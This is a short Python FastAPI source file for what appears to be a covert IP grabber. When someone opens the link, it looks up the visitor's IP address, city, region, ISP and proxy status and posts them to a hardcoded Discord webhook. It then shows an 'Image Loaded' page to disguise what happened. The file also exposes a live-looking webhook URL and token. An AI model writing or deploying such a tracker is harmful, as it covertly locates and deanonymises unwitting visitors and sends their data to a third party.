from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()
WEBHOOK_URL = "https://discord.com/api/webhooks/1508142381424181479/kAp7Gc6Mobt-RTVXyE9NKgnB9uwRVjOhQbIrjlyAVZ2cztc25vbq3mPRDT1JAE9ufbQi"

@app.get("/")
async def log_request(request: Request):
    print("--- CONNECTION RECEIVED ---") # This MUST show up in Render Logs
    
    forwarded = request.headers.get("x-forwarded-for")
    client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
    
    try:
        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query"
        resp = requests.get(url, timeout=5).json()
        
        if resp.get("status") == "success":
            msg = f"**Dashboard Log**\nIP: {resp.get('query')}\nLocation: {resp.get('city')}, {resp.get('regionName')}\nISP: {resp.get('isp')}\nProxy: {resp.get('proxy')}"
            requests.post(WEBHOOK_URL, json={"content": msg})
            print("--- DISCORD SENT ---")
        else:
            print("--- API FAILED ---")
    except Exception as e:
        print(f"--- ERROR: {e} ---")

    return HTMLResponse(content="<h1>Image Loaded</h1>")
